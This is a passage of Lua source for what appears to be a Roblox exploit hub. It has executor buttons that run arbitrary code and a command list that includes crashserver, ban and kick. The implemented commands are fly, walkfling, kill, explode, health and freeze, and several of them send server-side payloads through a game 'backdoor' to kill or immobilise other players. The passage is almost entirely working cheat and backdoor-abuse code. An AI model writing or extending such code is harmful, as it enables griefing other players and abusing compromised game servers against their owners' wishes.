uwu["execute from client button"].BorderColor3 = uwu["default border color"]
uwu["execute from client button"].BorderSizePixel = 1

uwu["execute from client button"].TextColor3 = uwu["default border color"]
uwu["execute from client button"].Font = Enum.Font.RobotoMono
uwu["execute from client button"].TextSize = 15
uwu["execute from client button"].TextScaled = false
uwu["execute from client button"].Text = "execute from client"
uwu["execute from client button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["execute from client button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["execute from client button text padding"] = Instance.new("UIPadding")
uwu["execute from client button text padding"].PaddingLeft = UDim.new(0, 0)
uwu["execute from client button text padding"].Parent = uwu["execute button"]

uwu["execute from client button"].Parent = uwu["main frame 1"]
uwu["execute from client button"].ZIndex = 19
uwu["execute from client button"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["clear button"].Size = UDim2.new(0, 67, 0, 45)
uwu["clear button"].Position = UDim2.new(0, 330, 0, 201)

uwu["clear button"].BackgroundColor3 = uwu["default background color"]

uwu["clear button"].BorderColor3 = uwu["default border color"]
uwu["clear button"].BorderSizePixel = 1

uwu["clear button"].TextColor3 = uwu["default border color"]
uwu["clear button"].Font = Enum.Font.RobotoMono
uwu["clear button"].TextSize = 15
uwu["clear button"].TextScaled = false
uwu["clear button"].Text = "clear"
uwu["clear button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["clear button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["clear button text padding"] = Instance.new("UIPadding")
uwu["clear button text padding"].PaddingLeft = UDim.new(0, 0)
uwu["clear button text padding"].Parent = uwu["clear button"]

uwu["clear button"].Parent = uwu["main frame 1"]
uwu["clear button"].ZIndex = 19
uwu["clear button"].Visible = false

uwu["execute button"].MouseButton1Click:Connect(function()
	if backdoor ~= nil then unablenotify("you cannot execute server code without a backdoor.") return end
	if hasscanned == true then return end
	local code = uwu["executor textbox"].Text
	spawn(function() playclicksound() end)
	if code and code ~= "" then
		assert(loadstring(code))()
	end
end)

uwu["execute from client button"].MouseButton1Click:Connect(function()
	local code = uwu["executor textbox"].Text
	spawn(function() playclicksound() end)
	if code and code ~= "" then
		assert(loadstring(code))()
	end
end)

uwu["clear button"].MouseButton1Click:Connect(function()
	uwu["executor textbox"].Text = ""
	updateCanvas()
	playclicksound()
end)

-------------------------------------------------------------------------------------------------------------------------------

local gameSpecificCommands = {
	[189707] = { -- nds
		"├ launchrocket, lr",
	},
	[1662219031] = { -- lip
		"├ strollerkill, skill [target]",
		"├ strollerbring, sbring [target]",
		"├ waterwalker, jesus",
		"├ kidrole, kid",
		"├ parentrole, parent",
		"├ petrole, pet",
		"├ teenrole, teen",
		"├ tospawn, spawn",
		"├ resetappearance, rea",
		"├ antiskintonechanger, astc",
		"├ crashserver, crash",
	},
}

local commandList = {
	"┌ game commands",
	"├───",
	"├ this game is not supported.",
	"└───",
	"",
	"┌ universal commands",
	"├───",
	"├ kill [target]",
	"├ health [target] [number]",
	"├ bodyfling, bfling [target]",
	"├ walkfling, wfling",
	"├ unwalkfling, unwfling",
	"├ fly [speed]",
	"├ unfly",
	"├ antivoid, av",
	"├ unantivoid, unav",
	"├ teleporttool, tptool",
	"├ notify, n [text]",
	"├ freeze, ice [target]",
	"├ unfreeze, thaw [target]",
	"├ explode [target]",
	-- "bang [target] [speed]",
	-- "unbang",
	-- "carpet [target]",
	-- "uncarpet",
	"├ spectate, view [target]",
	"├ unspectate, unview",
	-- "facebang [target]",
	-- "unfacebang",
	"├ jumpscare, js [target] [image id] [sound id]",
	-- "popup [target] [image id]",
	-- "unpopup [target]",
	-- "playaudio [target] [sound id]",
	"├ headbillboard, headbb [target] [image id]",
	"├ unheadbillboard, unheadbb [target]",
	-- "torsobillboard [target] [image id]",
	-- "untorsobillboard [target]",
	-- "punish [target]",
	-- "unpunish [target]",
	"├ spin [target] [speed]",
	"├ unspin [target]",
	-- "orbit [target] [speed] [offset]",
	-- "unorbit",
	-- "follow [target]",
	-- "unfollow",
	-- "creeper [target]",
	-- "uncreeper [target]",
	-- "headless [target]",
	-- "unheadless [target]",
	-- "hairless [target]",
	-- "unhairless [target]",
	"├ accessoryless, aless [target]",
	"├ unaccessoryless, unaless [target]",
	-- "forceplace [target] [game id]",
	"├ chickenarms, carms [target]",
	"├ discoavatar, davi [target]",
	"├ headslide, hslide [target]",
	"├ meshdisco, mdisco [target]",
	"├ fire [target]",
	"├ chat, talk [target] [text]",
	"├ particle [target] [image id]",
	"├ unparticle [target]",
	"├ screenimage, simage [target] [image id]",
	"├ unscreenimage, unsimage [target]",
	"├ decalspam, dspam [image id]",
	"├ billboardspam, bbspam [image id]",
	"├ replaceskybox, sky [image id]",
	-- "billboardspray [image id]",
	-- "unbillboardspray",
	"├ disco",
	"├ undisco",
	"├ fullbright, fb",
	"├ unfullbright, unfb",
	"├ music [sound id]",
	"├ unmusic",
	"├ volume [number]",
	"├ pitch [number]",
	"├ console",
	"├ esp",
	"├ unesp",
	"├ dynamic9007, dyn9007",
	"├ antifling, afling",
	"├ unantifling, uafling",
	"├ walkonwalls, wallwalk",
	-- "restoremap",
	"├ hint [text]",
	"├ closehints, nohints",
	"├ closeunlabeledhints, noulhints",
	"├ closelabeledhints, nolhints",
	"├ message [text]",
	"├ closemessages, nomsgs",
	"├ closeunlabeledmessages, noulmsgs",
	"├ closelabeledmessages, nolmsgs",
	"└───",
	"",
	"┌ backdoor commands",
	"├───",
	"├ guns [target]",
	"├ btools, f3x [target]",
	"├ tools [target]",
	"├ airstriketools, ast [target]",
	"├ r6 [target]",
	"├ r15 [target]",
	"├ respawn, re [target]",
	"├ eggdog [target]",
	"├ kick [target] [text]",
	"├ ban [target]",
	"├ kazotskykick, kk [target]",
	"└───",
	-- "",
	-- "dance1 [target]",
	-- "undance1 [target]",
	-- "dance2 [target]",
	-- "undance2 [target]",
	-- "dance3 [target]",
	-- "undance3 [target]",
	-- "wave [target]",
	-- "cheer [target]",
	-- "laugh [target]",
	-- "customdance [target]",
	-- "playanim [target] [animation id]",
	-- "spasm [target]",
	-- "unspasm [target]",
	-- "tpose [target]",
	-- "untpose [target]",
	-- "stopanim [target]",
	-- "reanim [target]",
	-- "headthrow [target]",
	"",
	"┌ tabs",
	"├───",
	"├ opendonuttab, donut",
	"├ openbinarytab, binary",
	"├ openheadcanongeneratortab, hcgen",
	"├ opengaydartab, gaydar",
	"├ openvideotab, video",
	"├ openmessagereversertab, msgreverser",
	"├ openk12encoderanddecodertab, k12",
	"└───",
}

local specificCommands = gameSpecificCommands[game.PlaceId]
if specificCommands then
	table.remove(commandList, 3)
	for i, line in ipairs(specificCommands) do
		table.insert(commandList, 2 + i, line)
	end
end

populateList(uwu["list of commands"], commandList)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spectate", "view", function(target)
	execcmd("unview")
	local players = uwu["players"]
	local localPlayer = players.LocalPlayer
	local camera = workspace.CurrentCamera

	local function getTargetPlayer(target)
		if target == "me" then
			return localPlayer
		elseif target == "random" then
			local allPlayers = players:GetPlayers()
			if #allPlayers > 0 then
				return allPlayers[math.random(1, #allPlayers)]
			end
		elseif target == "others" then
			return nil
		elseif target == "all" then
			return nil
		else
			for _, player in ipairs(players:GetPlayers()) do
				if player.Name:lower():find(target:lower(), 1, true) then
					return player
				end
			end
		end
		return nil
	end

	local targetPlayer = getTargetPlayer(target)

	if not targetPlayer or targetPlayer == localPlayer then
		return
	end

	local targetCharacter = targetPlayer.Character
	if targetCharacter and targetCharacter:FindFirstChild("Head") then
		camera.CameraSubject = targetCharacter.Head
	end
end)

addcommand("unspectate", "unview", function()
	workspace.CurrentCamera:remove()
	t(.1)
	repeat t() until uwu["local player"].Character ~= nil
	workspace.CurrentCamera.CameraSubject = uwu["local player"].Character:FindFirstChildWhichIsA('Humanoid')
	workspace.CurrentCamera.CameraType = "Custom"
	uwu["local player"].CameraMinZoomDistance = 0.5
	uwu["local player"].CameraMaxZoomDistance = 400
	uwu["local player"].CameraMode = "Classic"
	uwu["local player"].Character.Head.Anchored = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("notify", "n", function(...)
	text = table.concat({...}, " ")
	unablenotify(text)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("teleporttool", "tptool", function(...)
	local function hi()
		local maus = uwu["local player"]:GetMouse()
		local tool = Instance.new("Tool")
		tool.Name = "teleport tool"
		tool.RequiresHandle = false
		tool.Parent = uwu["local player"].Backpack
		tool.Activated:Connect(function()
			uwu["local player"].Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(maus.Hit.X, maus.Hit.Y + 3, maus.Hit.Z, select(4, uwu["local player"].Character:FindFirstChild("HumanoidRootPart").CFrame:components()))
		end)
		game:GetService"StarterGui":SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	end
	hi()
	uwu["local player"].CharacterAdded:Connect(hi)
end)

-------------------------------------------------------------------------------------------------------------------------------

FLYING = false
QEfly = true
iyflyspeed = 1
vehicleflyspeed = 1

function sFLY(vfly)
	repeat t() until uwu["players"].LocalPlayer and uwu["players"].LocalPlayer.Character and getRoot(uwu["players"].LocalPlayer.Character) and uwu["players"].LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	repeat t() until uwu["players"].LocalPlayer:GetMouse()
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

	local T = getRoot(uwu["players"].LocalPlayer.Character)
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0

	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro')
		local BV = Instance.new('BodyVelocity')
		BG.P = 9e4
		BG.Parent = T
		BV.Parent = T
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		task.spawn(function()
			repeat t()
				if not vfly and uwu["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					uwu["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:Destroy()
			BV:Destroy()
			if uwu["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				uwu["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end
	flyKeyDown = uwu["players"].LocalPlayer:GetMouse().KeyDown:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 's' then
			CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 'a' then
			CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 'd' then 
			CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
		elseif QEfly and KEY:lower() == 'e' then
			CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
		elseif QEfly and KEY:lower() == 'q' then
			CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
	end)
	flyKeyUp = uwu["players"].LocalPlayer:GetMouse().KeyUp:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'e' then
			CONTROL.Q = 0
		elseif KEY:lower() == 'q' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

function NOFLY()
	FLYING = false
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
	if uwu["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
		uwu["players"].LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end
	pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
end

local velocityHandlerName = "uwuvh"
local gyroHandlerName = "uwugh"
local mfly1
local mfly2

local unmobilefly = function(speaker)
	pcall(function()
		FLYING = false
		local root = getRoot(speaker.Character)
		root:FindFirstChild(velocityHandlerName):Destroy()
		root:FindFirstChild(gyroHandlerName):Destroy()
		speaker.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
		mfly1:Disconnect()
		mfly2:Disconnect()
	end)
end

local mobilefly = function(speaker, vfly)
	unmobilefly(speaker)
	FLYING = true

	local root = getRoot(speaker.Character)
	local camera = workspace.CurrentCamera
	local v3none = Vector3.new()
	local v3zero = Vector3.new(0, 0, 0)
	local v3inf = Vector3.new(9e9, 9e9, 9e9)

	local controlModule = require(speaker.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
	local bv = Instance.new("BodyVelocity")
	bv.Name = velocityHandlerName
	bv.Parent = root
	bv.MaxForce = v3zero
	bv.Velocity = v3zero

	local bg = Instance.new("BodyGyro")
	bg.Name = gyroHandlerName
	bg.Parent = root
	bg.MaxTorque = v3inf
	bg.P = 1000
	bg.D = 50

	mfly1 = speaker.CharacterAdded:Connect(function()
		local bv = Instance.new("BodyVelocity")
		bv.Name = velocityHandlerName
		bv.Parent = root
		bv.MaxForce = v3zero
		bv.Velocity = v3zero

		local bg = Instance.new("BodyGyro")
		bg.Name = gyroHandlerName
		bg.Parent = root
		bg.MaxTorque = v3inf
		bg.P = 1000
		bg.D = 50
	end)

	mfly2 = uwu["run service"].RenderStepped:Connect(function()
		root = getRoot(speaker.Character)
		camera = workspace.CurrentCamera
		if speaker.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			local VelocityHandler = root:FindFirstChild(velocityHandlerName)
			local GyroHandler = root:FindFirstChild(gyroHandlerName)

			VelocityHandler.MaxForce = v3inf
			GyroHandler.MaxTorque = v3inf
			if not vfly then humanoid.PlatformStand = true end
			GyroHandler.CFrame = camera.CoordinateFrame
			VelocityHandler.Velocity = v3none

			local direction = controlModule:GetMoveVector()
			if direction.X > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
			if direction.X < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
			if direction.Z > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
			if direction.Z < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
			end
		end
	end)
end

function isNumber(str)
	if tonumber(str) ~= nil or str == 'inf' then
		return true
	end
end

addcommand("fly", "fly", function(args)
	if not uwu["is mobile?"] then
		NOFLY()
		t()
		sFLY()
	else
		mobilefly(uwu["local player"])
	end
	if args and isNumber(args) then
		iyflyspeed = args
	end
end)

addcommand("unfly", "unfly", function(args)
	if not uwu["is mobile?"] then NOFLY() else unmobilefly(uwu["local player"]) end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("kill", "kill", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function brkjoints(player)
		if player and player.Character then
			player.Character:BreakJoints()
		end
	end

	local function keel(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game:GetService("Players").LocalPlayer
				if localPlayer then
					brkjoints(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					brkjoints(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game:GetService("Players").LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						brkjoints(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					brkjoints(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						brkjoints(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v.Character:BreakJoints()
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v.Character:BreakJoints()
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v.Character:BreakJoints()
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v.Character:BreakJoints()
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v.Character:BreakJoints()
						end
					end
				]], player.Name)
				break
			end
		end
	end

	keel(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("explode", "explode", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function kaboom(player)
		if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local character = player.Character
			local explosion = Instance.new("Explosion")
			explosion.Position = character.HumanoidRootPart.Position
			explosion.BlastPressure = 0
			explosion.BlastRadius = 10
			explosion.Parent = workspace

			if character:FindFirstChild("Humanoid") then
				character.Humanoid.Health = 0
			end

			for _, part in pairs(character:GetChildren()) do
				if part:IsA("Motor6D") then
					part:Destroy()
				end
			end
		end
	end

	local function explod(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game:GetService("Players").LocalPlayer
				if localPlayer then
					kaboom(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					kaboom(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game:GetService("Players").LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						kaboom(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					kaboom(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						kaboom(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local explosion = Instance.new("Explosion")
						explosion.Position = v.Character.HumanoidRootPart.Position
						explosion.BlastPressure = 0
						explosion.BlastRadius = 10
						explosion.Parent = workspace
						for _, part in pairs(v.Character:GetChildren()) do
							if part:IsA("Motor6D") then
								part:Destroy()
							end
						end
						v.Character.Humanoid.Health = 0
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local explosion = Instance.new("Explosion")
							explosion.Position = v.Character.HumanoidRootPart.Position
							explosion.BlastPressure = 0
							explosion.BlastRadius = 10
							explosion.Parent = workspace
							for _, part in pairs(v.Character:GetChildren()) do
								if part:IsA("Motor6D") then
									part:Destroy()
								end
							end
							v.Character.Humanoid.Health = 0
						end
					end
				]], player.Name)
				break
			end
		end
	end

	explod(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("health", "health", function(target, number)
	local players = game:GetService("Players"):GetPlayers()
	local amt = tonumber(number)

	if not amt then
		return
	end

	local function health(player)
		local character = player.Character
		if character then
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Health = amt
			end
		end
	end

	local function sethealth(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					health(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					health(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						health(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					health(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						health(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. amt .. [[
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoid = character:FindFirstChildOfClass("Humanoid")
							if humanoid then
								humanoid.Health = ]] .. amt .. [[
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. amt .. [[
						end
					end
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. amt .. [[
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoid = character:FindFirstChildOfClass("Humanoid")
								if humanoid then
									humanoid.Health = ]] .. amt .. [[
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	sethealth(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

local walkflinging = false

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

function disablewalkfling()
	walkflinging = false
end

function enablewalkfling()
	local humanoid = uwu["local player"].Character:FindFirstChildWhichIsA("Humanoid")
	if humanoid then
		humanoid.Died:Connect(function()
			disablewalkfling()
		end)
	end

	local walkflinging = true
	repeat uwu["run service"].RenderStepped:Wait()
		local character = uwu["local player"].Character
		local root = getRoot(character)
		local vel, movel = nil, 0.1

		while not (character and character.Parent and root and root.Parent) do
			uwu["run service"].Heartbeat:Wait()
			character = uwu["local player"].Character
			root = getRoot(character)
		end

		vel = root.Velocity
		root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)

		uwu["run service"].Stepped:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel
		end

		uwu["run service"].Heartbeat:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel + Vector3.new(0, movel, 0)
			movel = movel * -1
		end
	until walkflinging == false
end

addcommand("walkfling", "wfling", function()
	enablewalkfling()
end)

addcommand("unwalkfling", "unwfling", function()
	disablewalkfling()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("freeze", "ice", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function iceicebaby(player)
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				humanoidRootPart.Anchored = true
				local humanoid = character:FindFirstChild("Humanoid")
				if humanoid then
					humanoid.PlatformStand = true
				end
			end
		end
	end

	local function colddddd(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					iceicebaby(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					iceicebaby(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						iceicebaby(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					iceicebaby(player)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						iceicebaby(player)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
